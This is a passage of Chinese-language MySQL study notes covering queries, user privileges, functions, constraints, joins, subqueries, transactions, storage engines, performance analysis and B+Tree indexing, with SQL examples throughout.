升序（默认）\nDESC: 降序\n\n例子：\n-- 根据年龄升序排序\nSELECT * FROM employee ORDER BY age ASC;\nSELECT * FROM employee ORDER BY age;\n-- 两字段排序，根据年龄升序排序，入职时间降序排序\nSELECT * FROM employee ORDER BY age ASC, entrydate DESC;\n\n注意事项如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序\n分页查询语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数;\n例子：\n-- 查询第一页数据，展示10条\nSELECT * FROM employee LIMIT 0, 10;\n-- 查询第二页\nSELECT * FROM employee LIMIT 10, 10;\n\n注意事项\n起始索引从0开始，起始索引 &#x3D; （查询页码 - 1） * 每页显示记录数\n分页查询是数据库的方言，不同数据库有不同实现，MySQL是LIMIT\n如果查询的是第一页数据，起始索引可以省略，直接简写 LIMIT 10\n\nDQL执行顺序FROM -&gt; WHERE -&gt; GROUP BY -&gt; SELECT -&gt; ORDER BY -&gt; LIMIT\nDCL管理用户查询用户：\nUSE mysql;\nSELECT * FROM user;\n\n创建用户:CREATE USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED BY &#39;密码&#39;;\n修改用户密码：ALTER USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED WITH mysql_native_password BY &#39;新密码&#39;;\n删除用户：DROP USER &#39;用户名&#39;@&#39;主机名&#39;;\n例子：\n-- 创建用户test，只能在当前主机localhost访问\ncreate user &#39;test&#39;@&#39;localhost&#39; identified by &#39;123456&#39;;\n-- 创建用户test，能在任意主机访问\ncreate user &#39;test&#39;@&#39;%&#39; identified by &#39;123456&#39;;\ncreate user &#39;test&#39; identified by &#39;123456&#39;;\n-- 修改密码\nalter user &#39;test&#39;@&#39;localhost&#39; identified with mysql_native_password by &#39;1234&#39;;\n-- 删除用户\ndrop user &#39;test&#39;@&#39;localhost&#39;;\n\n注意事项\n主机名可以使用 % 通配\n\n权限控制常用权限：\n\n\n\n权限\n说明\n\n\n\nALL, ALL PRIVILEGES\n所有权限\n\n\nSELECT\n查询数据\n\n\nINSERT\n插入数据\n\n\nUPDATE\n修改数据\n\n\nDELETE\n删除数据\n\n\nALTER\n修改表\n\n\nDROP\n删除数据库&#x2F;表&#x2F;视图\n\n\nCREATE\n创建数据库&#x2F;表\n\n\n更多权限请看权限一览表\n查询权限：SHOW GRANTS FOR &#39;用户名&#39;@&#39;主机名&#39;;\n授予权限：GRANT 权限列表 ON 数据库名.表名 TO &#39;用户名&#39;@&#39;主机名&#39;;\n撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM &#39;用户名&#39;@&#39;主机名&#39;;\n注意事项\n多个权限用逗号分隔\n授权时，数据库名和表名可以用 * 进行通配，代表所有\n\n函数\n字符串函数\n数值函数\n日期函数\n流程函数\n\n字符串函数常用函数：\n\n\n\n函数\n功能\n\n\n\nCONCAT(s1, s2, …, sn)\n字符串拼接，将s1, s2, …, sn拼接成一个字符串\n\n\nLOWER(str)\n将字符串全部转为小写\n\n\nUPPER(str)\n将字符串全部转为大写\n\n\nLPAD(str, n, pad)\n左填充，用字符串pad对str的左边进行填充，达到n个字符串长度\n\n\nRPAD(str, n, pad)\n右填充，用字符串pad对str的右边进行填充，达到n个字符串长度\n\n\nTRIM(str)\n去掉字符串头部和尾部的空格\n\n\nSUBSTRING(str, start, len)\n返回从字符串str从start位置起的len个长度的字符串\n\n\nREPLACE(column, source, replace)\n替换字符串\n\n\n使用示例：\n-- 拼接\nSELECT CONCAT(&#39;Hello&#39;, &#39;World&#39;);\n-- 小写\nSELECT LOWER(&#39;Hello&#39;);\n-- 大写\nSELECT UPPER(&#39;Hello&#39;);\n-- 左填充\nSELECT LPAD(&#39;01&#39;, 5, &#39;-&#39;);\n-- 右填充\nSELECT RPAD(&#39;01&#39;, 5, &#39;-&#39;);\n-- 去除空格\nSELECT TRIM(&#39; Hello World &#39;);\n-- 切片（起始索引为1）\nSELECT SUBSTRING(&#39;Hello World&#39;, 1, 5);\n\n数值函数常见函数：\n\n\n\n函数\n功能\n\n\n\nCEIL(x)\n向上取整\n\n\nFLOOR(x)\n向下取整\n\n\nMOD(x, y)\n返回x&#x2F;y的模\n\n\nRAND()\n返回0~1内的随机数\n\n\nROUND(x, y)\n求参数x的四舍五入值，保留y位小数\n\n\n日期函数常用函数：\n\n\n\n函数\n功能\n\n\n\nCURDATE()\n返回当前日期\n\n\nCURTIME()\n返回当前时间\n\n\nNOW()\n返回当前日期和时间\n\n\nYEAR(date)\n获取指定date的年份\n\n\nMONTH(date)\n获取指定date的月份\n\n\nDAY(date)\n获取指定date的日期\n\n\nDATE_ADD(date, INTERVAL expr type)\n返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值\n\n\nDATEDIFF(date1, date2)\n返回起始时间date1和结束时间date2之间的天数\n\n\n例子：\n-- DATE_ADD\nSELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);\n\n流程函数常用函数：\n\n\n\n函数\n功能\n\n\n\nIF(value, t, f)\n如果value为true，则返回t，否则返回f\n\n\nIFNULL(value1, value2)\n如果value1不为空，返回value1，否则返回value2\n\n\nCASE WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END\n如果val1为true，返回res1，… 否则返回default默认值\n\n\nCASE [ expr ] WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END\n如果expr的值等于val1，返回res1，… 否则返回default默认值\n\n\n例子：\nselect\n\tname,\n\t(case when age &gt; 30 then &#39;中年&#39; else &#39;青年&#39; end)\nfrom employee;\nselect\n\tname,\n\t(case workaddress when &#39;北京市&#39; then &#39;一线城市&#39; when &#39;上海市&#39; then &#39;一线城市&#39; else &#39;二线城市&#39; end) as &#39;工作地址&#39;\nfrom employee;\n\n约束分类：\n\n\n\n约束\n描述\n关键字\n\n\n\n非空约束\n限制该字段的数据不能为null\nNOT NULL\n\n\n唯一约束\n保证该字段的所有数据都是唯一、不重复的\nUNIQUE\n\n\n主键约束\n主键是一行数据的唯一标识，要求非空且唯一\nPRIMARY KEY\n\n\n默认约束\n保存数据时，如果未指定该字段的值，则采用默认值\nDEFAULT\n\n\n检查约束（8.0.1版本后）\n保证字段值满足某一个条件\nCHECK\n\n\n外键约束\n用来让两张图的数据之间建立连接，保证数据的一致性和完整性\nFOREIGN KEY\n\n\n约束是作用于表中字段上的，可以再创建表&#x2F;修改表的时候添加约束。\n常用约束\n\n\n约束条件\n关键字\n\n\n\n主键\nPRIMARY KEY\n\n\n自动增长\nAUTO_INCREMENT\n\n\n不为空\nNOT NULL\n\n\n唯一\nUNIQUE\n\n\n逻辑条件\nCHECK\n\n\n默认值\nDEFAULT\n\n\n例子：\ncreate table user(\n\tid int primary key auto_increment,\n\tname varchar(10) not null unique,\n\tage int check(age &gt; 0 and age &lt; 120),\n\tstatus char(1) default &#39;1&#39;,\n\tgender char(1)\n);\n\n外键约束添加外键：\nCREATE TABLE 表名(\n\t字段名 字段类型,\n\t...\n\t[CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)\n);\nALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表(主表列名);\n\n-- 例子\nalter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);\n\n删除外键：ALTER TABLE 表名 DROP FOREIGN KEY 外键名;\n删除&#x2F;更新行为\n\n\n行为\n说明\n\n\n\nNO ACTION\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除&#x2F;更新（与RESTRICT一致）\n\n\nRESTRICT\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除&#x2F;更新（与NO ACTION一致）\n\n\nCASCADE\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则也删除&#x2F;更新外键在子表中的记录\n\n\nSET NULL\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则设置子表中该外键值为null（要求该外键允许为null）\n\n\nSET DEFAULT\n父表有变更时，子表将外键设为一个默认值（Innodb不支持）\n\n\n更改删除&#x2F;更新行为：ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;\n多表查询多表关系\n一对多（多对一）\n多对多\n一对一\n\n一对多案例：部门与员工关系：一个部门对应多个员工，一个员工对应一个部门实现：在多的一方建立外键，指向一的一方的主键\n多对多案例：学生与课程关系：一个学生可以选多门课程，一门课程也可以供多个学生选修实现：建立第三张中间表，中间表至少包含两个外键，分别关联两方主键\n一对一案例：用户与用户详情关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率实现：在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的（UNIQUE）\n查询合并查询（笛卡尔积，会展示所有组合结果）：select * from employee, dept;\n\n\n\n\n\n\n\n\n\n笛卡尔积：两个集合A集合和B集合的所有组合情况（在多表查询时，需要消除无效的笛卡尔积）\n消除无效笛卡尔积：select * from employee, dept where employee.dept = dept.id;\n内连接查询内连接查询的是两张表交集的部分\n隐式内连接：SELECT 字段列表 FROM 表1, 表2 WHERE 条件 ...;\n显式内连接：SELECT 字段列表 FROM 表1 [ INNER ] JOIN 表2 ON 连接条件 ...;\n显式性能比隐式高\n例子：\n-- 查询员工姓名，及关联的部门的名称\n-- 隐式\nselect e.name, d.name from employee as e, dept as d where e.dept &#x3D; d.id;\n-- 显式\nselect e.name, d.name from employee as e inner join dept as d on e.dept &#x3D; d.id;\n\n外连接查询左外连接：查询左表所有数据，以及两张表交集部分数据SELECT 字段列表 FROM 表1 LEFT [ OUTER ] JOIN 表2 ON 条件 ...;相当于查询表1的所有数据，包含表1和表2交集部分数据\n右外连接：查询右表所有数据，以及两张表交集部分数据SELECT 字段列表 FROM 表1 RIGHT [ OUTER ] JOIN 表2 ON 条件 ...;\n例子：\n-- 左\nselect e.*, d.name from employee as e left outer join dept as d on e.dept &#x3D; d.id;\nselect d.name, e.* from dept d left outer join emp e on e.dept &#x3D; d.id;  -- 这条语句与下面的语句效果一样\n-- 右\nselect d.name, e.* from employee as e right outer join dept as d on e.dept &#x3D; d.id;\n\n左连接可以查询到没有dept的employee，右连接可以查询到没有employee的dept\n自连接查询当前表与自身的连接查询，自连接必须使用表别名\n语法：SELECT 字段列表 FROM 表A 别名A JOIN 表A 别名B ON 条件 ...;\n自连接查询，可以是内连接查询，也可以是外连接查询\n例子：\n-- 查询员工及其所属领导的名字\nselect a.name, b.name from employee a, employee b where a.manager &#x3D; b.id;\n-- 没有领导的也查询出来\nselect a.name, b.name from employee a left join employee b on a.manager &#x3D; b.id;\n\n联合查询 union, union all把多次查询的结果合并，形成一个新的查询集\n语法：\nSELECT 字段列表 FROM 表A ...\nUNION [ALL]\nSELECT 字段列表 FROM 表B ...\n\n注意事项\nUNION ALL 会有重复结果，UNION 不会\n联合查询比使用or效率高，不会使索引失效\n\n子查询SQL语句中嵌套SELECT语句，称谓嵌套查询，又称子查询。SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2);子查询外部的语句可以是 INSERT &#x2F; UPDATE &#x2F; DELETE &#x2F; SELECT 的任何一个\n根据子查询结果可以分为：\n\n标量子查询（子查询结果为单个值）\n列子查询（子查询结果为一列）\n行子查询（子查询结果为一行）\n表子查询（子查询结果为多行多列）\n\n根据子查询位置可分为：\n\nWHERE 之后\nFROM 之后\nSELECT 之后\n\n标量子查询子查询返回的结果是单个值（数字、字符串、日期等）。常用操作符：- &lt; &gt; &gt; &gt;&#x3D; &lt; &lt;&#x3D;\n例子：\n-- 查询销售部所有员工\nselect id from dept where name &#x3D; &#39;销售部&#39;;\n-- 根据销售部部门ID，查询员工信息\nselect * from employee where dept &#x3D; 4;\n-- 合并（子查询）\nselect * from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;销售部&#39;);\n\n-- 查询xxx入职之后的员工信息\nselect * from employee where entrydate &gt; (select entrydate from employee where name &#x3D; &#39;xxx&#39;);\n\n列子查询返回的结果是一列（可以是多行）。\n常用操作符：\n\n\n\n操作符\n描述\n\n\n\nIN\n在指定的集合范围内，多选一\n\n\nNOT IN\n不在指定的集合范围内\n\n\nANY\n子查询返回列表中，有任意一个满足即可\n\n\nSOME\n与ANY等同，使用SOME的地方都可以使用ANY\n\n\nALL\n子查询返回列表的所有值都必须满足\n\n\n例子：\n-- 查询销售部和市场部的所有员工信息\nselect * from employee where dept in (select id from dept where name &#x3D; &#39;销售部&#39; or name &#x3D; &#39;市场部&#39;);\n-- 查询比财务部所有人工资都高的员工信息\nselect * from employee where salary &gt; all(select salary from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;财务部&#39;));\n-- 查询比研发部任意一人工资高的员工信息\nselect * from employee where salary &gt; any (select salary from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;研发部&#39;));\n\n行子查询返回的结果是一行（可以是多列）。常用操作符：&#x3D;, &lt;, &gt;, IN, NOT IN\n例子：\n-- 查询与xxx的薪资及直属领导相同的员工信息\nselect * from employee where (salary, manager) &#x3D; (12500, 1);\nselect * from employee where (salary, manager) &#x3D; (select salary, manager from employee where name &#x3D; &#39;xxx&#39;);\n\n表子查询返回的结果是多行多列常用操作符：IN\n例子：\n-- 查询与xxx1，xxx2的职位和薪资相同的员工\nselect * from employee where (job, salary) in (select job, salary from employee where name &#x3D; &#39;xxx1&#39; or name &#x3D; &#39;xxx2&#39;);\n-- 查询入职日期是2006-01-01之后的员工，及其部门信息\nselect e.*, d.* from (select * from employee where entrydate &gt; &#39;2006-01-01&#39;) as e left join dept as d on e.dept &#x3D; d.id;\n\n事务事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。\n基本操作：\n-- 1. 查询张三账户余额\nselect * from account where name &#x3D; &#39;张三&#39;;\n-- 2. 将张三账户余额-1000\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\n-- 此语句出错后张三钱减少但是李四钱没有增加\n模拟sql语句错误\n-- 3. 将李四账户余额+1000\nupdate account set money &#x3D; money + 1000 where name &#x3D; &#39;李四&#39;;\n\n-- 查看事务提交方式\nSELECT @@AUTOCOMMIT;\n-- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效\nSET @@AUTOCOMMIT &#x3D; 0;\n-- 提交事务\nCOMMIT;\n-- 回滚事务\nROLLBACK;\n\n-- 设置手动提交后上面代码改为：\nselect * from account where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money + 1000 where name &#x3D; &#39;李四&#39;;\ncommit;\n\n操作方式二：\n开启事务：START TRANSACTION 或 BEGIN TRANSACTION;提交事务：COMMIT;回滚事务：ROLLBACK;\n操作实例：\nstart transaction;\nselect * from account where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money + 1000 where name &#x3D; &#39;李四&#39;;\ncommit;\n\n四大特性ACID\n原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败\n一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态\n隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行\n持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的\n\n并发事务\n\n\n问题\n描述\n\n\n\n脏读\n一个事务读到另一个事务还没提交的数据\n\n\n不可重复读\n一个事务先后读取同一条记录，但两次读取的数据不同\n\n\n幻读\n一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在\n\n\n\n\n\n\n\n\n\n\n\n这三个问题的详细演示：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd \n并发事务隔离级别：\n\n\n\n隔离级别\n脏读\n不可重复读\n幻读\n\n\n\nRead uncommitted\n√\n√\n√\n\n\nRead committed\n×\n√\n√\n\n\nRepeatable Read(默认)\n×\n×\n√\n\n\nSerializable\n×\n×\n×\n\n\n\n√表示在当前隔离级别下该问题会出现\nSerializable 性能最低；Read uncommitted 性能最高，数据安全性最差\n\n查看事务隔离级别：SELECT @@TRANSACTION_ISOLATION;设置事务隔离级别：SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;;SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效\n进阶篇存储引擎MySQL体系结构：\n\n存储引擎就是存储数据、建立索引、更新&#x2F;查询数据等技术的实现方式。存储引擎是基于表而不是基于库的，所以存储引擎也可以被称为表引擎。默认存储引擎是InnoDB。\n相关操作：\n-- 查询建表语句\nshow create table account;\n-- 建表时指定存储引擎\nCREATE TABLE 表名(\n\t...\n) ENGINE&#x3D;INNODB;\n-- 查看当前数据库支持的存储引擎\nshow engines;\n\nInnoDBInnoDB 是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB 是默认的 MySQL 引擎。\n特点：\n\nDML 操作遵循 ACID 模型，支持事务\n行级锁，提高并发访问性能\n支持外键约束，保证数据的完整性和正确性\n\n文件：\n\nxxx.ibd: xxx代表表名，InnoDB 引擎的每张表都会对应这样一个表空间文件，存储该表的表结构（frm、sdi）、数据和索引。\n\n参数：innodb_file_per_table，决定多张表共享一个表空间还是每张表对应一个表空间\n知识点：\n查看 Mysql 变量：show variables like &#39;innodb_file_per_table&#39;;\n从idb文件提取表结构数据：（在cmd运行）ibd2sdi xxx.ibd\nInnoDB 逻辑存储结构：\nMyISAMMyISAM 是 MySQL 早期的默认存储引擎。\n特点：\n\n不支持事务，不支持外键\n支持表锁，不支持行锁\n访问速度快\n\n文件：\n\nxxx.sdi: 存储表结构信息\nxxx.MYD: 存储数据\nxxx.MYI: 存储索引\n\nMemoryMemory 引擎的表数据是存储在内存中的，受硬件问题、断电问题的影响，只能将这些表作为临时表或缓存使用。\n特点：\n\n存放在内存中，速度快\nhash索引（默认）\n\n文件：\n\nxxx.sdi: 存储表结构信息\n\n存储引擎特点\n\n\n特点\nInnoDB\nMyISAM\nMemory\n\n\n\n存储限制\n64TB\n有\n有\n\n\n事务安全\n支持\n-\n-\n\n\n锁机制\n行锁\n表锁\n表锁\n\n\nB+tree索引\n支持\n支持\n支持\n\n\nHash索引\n-\n-\n支持\n\n\n全文索引\n支持（5.6版本之后）\n支持\n-\n\n\n空间使用\n高\n低\nN&#x2F;A\n\n\n内存使用\n高\n低\n中等\n\n\n批量插入速度\n低\n高\n高\n\n\n支持外键\n支持\n-\n-\n\n\n存储引擎的选择在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。对于复杂的应用系统，还可以根据实际情况选择多种存储引擎进行组合。\n\nInnoDB: 如果应用对事物的完整性有比较高的要求，在并发条件下要求数据的一致性，数据操作除了插入和查询之外，还包含很多的更新、删除操作，则 InnoDB 是比较合适的选择\nMyISAM: 如果应用是以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性、并发性要求不高，那这个存储引擎是非常合适的。\nMemory: 将所有数据保存在内存中，访问速度快，通常用于临时表及缓存。Memory 的缺陷是对表的大小有限制，太大的表无法缓存在内存中，而且无法保障数据的安全性\n\n电商中的足迹和评论适合使用 MyISAM 引擎，缓存适合使用 Memory 引擎。\n性能分析查看执行频次查看当前数据库的 INSERT, UPDATE, DELETE, SELECT 访问频次：SHOW GLOBAL STATUS LIKE &#39;Com_______&#39;; 或者 SHOW SESSION STATUS LIKE &#39;Com_______&#39;;例：show global status like &#39;Com_______&#39;\n慢查询日志慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。MySQL的慢查询日志默认没有开启，需要在MySQL的配置文件（&#x2F;etc&#x2F;my.cnf）中配置如下信息：    # 开启慢查询日志开关    slow_query_log&#x3D;1    # 设置慢查询日志的时间为2秒，SQL语句执行时间超过2秒，就会视为慢查询，记录慢查询日志    long_query_time&#x3D;2更改后记得重启MySQL服务，日志文件位置：&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;localhost-slow.log\n查看慢查询日志开关状态：show variables like &#39;slow_query_log&#39;;\nprofileshow profile 能在做SQL优化时帮我们了解时间都耗费在哪里。通过 have_profiling 参数，能看到当前 MySQL 是否支持 profile 操作：SELECT @@have_profiling;profiling 默认关闭，可以通过set语句在session&#x2F;global级别开启 profiling：SET profiling = 1;查看所有语句的耗时：show profiles;查看指定query_id的SQL语句各个阶段的耗时：show profile for query query_id;查看指定query_id的SQL语句CPU的使用情况show profile cpu for query query_id;\nexplainEXPLAIN 或者 DESC 命令获取 MySQL 如何执行 SELECT 语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。语法：    # 直接在select语句之前加上关键字 explain &#x2F; desc    EXPLAIN SELECT 字段列表 FROM 表名 HWERE 条件;\nEXPLAIN 各字段含义：\n\nid：select 查询的序列号，表示查询中执行 select 子句或者操作表的顺序（id相同，执行顺序从上到下；id不同，值越大越先执行）\nselect_type：表示 SELECT 的类型，常见取值有 SIMPLE（简单表，即不适用表连接或者子查询）、PRIMARY（主查询，即外层的查询）、UNION（UNION中的第二个或者后面的查询语句）、SUBQUERY（SELECT&#x2F;WHERE之后包含了子查询）等\ntype：表示连接类型，性能由好到差的连接类型为 NULL、system、const、eq_ref、ref、range、index、all\npossible_key：可能应用在这张表上的索引，一个或多个\nKey：实际使用的索引，如果为 NULL，则没有使用索引\nKey_len：表示索引中使用的字节数，该值为索引字段最大可能长度，并非实际使用长度，在不损失精确性的前提下，长度越短越好\nrows：MySQL认为必须要执行的行数，在InnoDB引擎的表中，是一个估计值，可能并不总是准确的\nfiltered：表示返回结果的行数占需读取行数的百分比，filtered的值越大越好\n\n索引索引是帮助 MySQL 高效获取数据的数据结构（有序）。在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构上实现高级查询算法，这种数据结构就是索引。\n优缺点：\n优点：\n\n提高数据检索效率，降低数据库的IO成本\n通过索引列对数据进行排序，降低数据排序的成本，降低CPU的消耗\n\n缺点：\n\n索引列也是要占用空间的\n索引大大提高了查询效率，但降低了更新的速度，比如 INSERT、UPDATE、DELETE\n\n索引结构\n\n\n索引结构\n描述\n\n\n\nB+Tree\n最常见的索引类型，大部分引擎都支持B+树索引\n\n\nHash\n底层数据结构是用哈希表实现，只有精确匹配索引列的查询才有效，不支持范围查询\n\n\nR-Tree(空间索引)\n空间索引是 MyISAM 引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少\n\n\nFull-Text(全文索引)\n是一种通过建立倒排索引，快速匹配文档的方式，类似于 Lucene, Solr, ES\n\n\n\n\n\n索引\nInnoDB\nMyISAM\nMemory\n\n\n\nB+Tree索引\n支持\n支持\n支持\n\n\nHash索引\n不支持\n不支持\n支持\n\n\nR-Tree索引\n不支持\n支持\n不支持\n\n\nFull-text\n5.6版本后支持\n支持\n不支持\n\n\nB-Tree\n二叉树的缺点可以用红黑树来解决：红黑树也存在大数据量情况下，层级较深，检索速度慢的问题。\n为了解决上述问题，可以使用 B-Tree 结构。B-Tree (多路平衡查找树) 以一棵最大度数（max-degree，指一个节点的子节点个数）为5（5阶）的 b-tree 为例（每个节点最多存储4个key，5个指针）\n\n\n\n\n\n\n\n\n\n\nB-Tree 的数据插入过程动画参照：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=68演示地址：https://www.cs.usfca.edu/~galles/visualization/BTree.html\nB+Tree结构图：\n\n\n\n\n\n\n\n\n\n\n演示地址：https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html\n与 B-Tree 的区别：\n\n所有的数据都会出现在叶子节点\n叶子节点形成一个单向链表\n\nMySQL 索引数据结构对经典的 B+Tree 进行了优化。在原 B+Tree 的基础上，增加一个指向相邻叶子节点的链表指针，就形成了带有顺序指针的 B+Tree，提高区间访问的性能。\n\nHash哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。如果两个（或多个）键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。\n\n特点：\n\nHash索引只能用于对等比较（&#x3D;、in），不支持范围查询（betwwn、&gt;、&lt;、…）\n无法利用索引完成排序操作\n查询效率高，通常只需要一次检索就可以了，效率通常要高于 B+Tree 索引\n\n存储引擎支持：\n\nMemory\nInnoDB: 具有自适应hash功能，hash索引是存储引擎根据 B+Tree 索引在指定条件下自动构建的\n\n面试题\n为什么 InnoDB 存储引擎选择使用 B+Tree 索引结构？\n\n\n相对于二叉树，层级更少，搜索效率高\n对于 B-Tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针也跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低\n相对于 Hash 索引，B+Tree 支持范围匹配及排序操作\n\n索引分类\n\n\n分类\n含义\n特点\n关键字\n\n\n\n主键索引\n针对于表中主键创建的索引\n默认自动创建，只能有一个\nPRIMARY\n\n\n唯一索引\n避免同一个表中某数据列中的值重复\n可以有多个\nUNIQUE\n\n\n常规索引\n快速定位特定数据\n可以有多个\n\n\n\n全文索引\n全文索引查找的是文本中的关键词，而不是比较索引中的值\n可以有多个\nFULLTEXT\n\n\n在 InnoDB 存储引擎中，根据索引的存储形式，又可以分为以下两种：\n\n\n\n分类\n含义\n特点\n\n\n\n聚集索引(Clustered Index)\n将数据存储与索引放一块，索引结构的叶子节点保存了行数据\n必须有，而且只有一个\n\n\n二级索引(Secondary Index)\n将数据与索引分开存储，索引结构的叶子节点关联的是对应的主键\n可以存在多个\n\n\n演示图：\n\n聚集索引选取规则：\n\n如果存在主键，主键索引就是聚集索引\n如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引\n如果表没有主键或没有合适的唯一索引，则 InnoDB 会自动生成一个 rowid 作为隐藏的聚集索引\n\n思考题1. 以下 SQL 语句，哪个执行效率高？为什么？\nselect * from user where id &#x3D; 10;\nselect * from user where name &#x3D; &#39;Arm&#39;;\n-- 备注：id为主键，name字段创建的有索引\n\n答：第一条语句，因为第二条需要回表查询，相当于两个步骤。\n2. InnoDB 主键索引的 B+Tree 高度为多少？\n答：假设一行数据大小为1k，一页中可以存储16行这样的数据。InnoDB 的指针占用6个字节的空间，主键假设为bigint，占用字节数为8.可得公式：n * 8 + (n + 1) * 6 = 16 * 1024，其中 8 表示 bigint 占用的字节数，n 表示当前节点存储的key的数量，(n + 1) 表示指针数量（比key多一个）。算出n约为1170。\n如果树的高度为2，那么他能存储的数据量大概为：1171 * 16 = 18736；如果树的高度为3，那么他能存储的数据量大概为：1171 * 1171 * 16 = 21939856。\n另外，如果有成千上万的数据，那么就要考虑分表，涉及运维篇知识。\n语法创建索引：CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name (index_col_name, ...);如果不加 CREATE 后面不加索引类型参数，则创建的是常规索引\n查看索引：SHOW INDEX FROM table_name;\n删除索引：DROP INDEX index_name ON table_name;\n案例：\n-- name字段为姓名字段，该字段的值可能会重复，为该字段创建索引\ncreate index idx_user_name on tb_user(name);\n-- phone手机号字段的值非空，且唯一，为该字段创建唯一索引\ncreate unique index idx_user_phone on tb_user (phone);\n-- 为profession, age, status创建联合索引\ncreate index idx_user_pro_age_stat on tb_user(profession, age, status);\n-- 为email建立合适的索引来提升查询效率\ncreate index idx_user_email on tb_user(email);\n\n-- 删除索引\ndrop index idx_user_email on tb_user;\n\n使用规则最左前缀法则如果索引关联了多列（联合索引），要遵守最左前缀法则，最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将部分失效（后面的字段索引失效）。\n联合索引中，出现范围查询（&lt;, &gt;），范围查询右侧的列索引失效。可以用&gt;&#x3D;或者&lt;&#x3D;来规避索引失效问题。\n索引失效情况\n在索引列上进行运算操作，索引将失效。如：explain select * from tb_user where substring(phone, 10, 2) = &#39;15&#39;;\n字符串类型字段使用时，不加引号，索引将失效。如：explain select * from tb_user where phone = 17799990015;，此处phone的值没有加引号\n模糊查询中，如果仅仅是尾部模糊匹配，索引不会是失效；如果是头部模糊匹配，索引失效。如：explain select * from tb_user where profession like &#39;%工程&#39;;，前后都有 % 也会失效。\n用 or 分割开的条件，如果 or 其中一个条件的列没有索引，那么涉及的索引都不会被用到。\n如果 MySQL 评估使用索引比全表更慢，则不使用索引。\n\nSQL 提示是优化数据库的一个重要手段，简单来说，就是在SQL语句中加入一些人为的提示来达到优化操作的目的。\n例如，使用索引：explain select * from tb_user use index(idx_user_pro) where profession=&quot;软件工程&quot;;不使用哪个索引：explain select * from tb_user ignore index(idx_user_pro) where profession=&quot;软件工程&quot;;必须使用哪个索引：explain select * from tb_user force index(idx_user_pro) where profession=&quot;软件工程&quot;;\nuse 是建议，实际使用哪个索引 MySQL 还会自己权衡运行速度去更改，force就是无论如何都强制使用该索引。\n覆盖索引&amp;回表查询尽量使用覆盖索引（查询使用了索引，并且需要返回的列，在该索引中已经全部能找到），减少 select *。\nexplain 中 extra 字段含义：using index condition：查找使用了索引，但是需要回表查询数据using where; using index;：查找使用了索引，但是需要的数据都在索引列中能找到，所以不需要回表查询\n如果在聚集索引中直接能找到对应的行，则直接返回行数据，只需要一次查询，哪怕是select *；如果在辅助索引中找聚集索引，如select id, name from xxx where name=&#39;xxx&#39;;，也只需要通过辅助索引(name)查找到对应的id，返回name和name索引对应的id即可，只需要一次查询；如果是通过辅助索引查找其他字段，则需要回表查询，如select id, name, gender from xxx where name=&#39;xxx&#39;;\n所以尽量不要用select 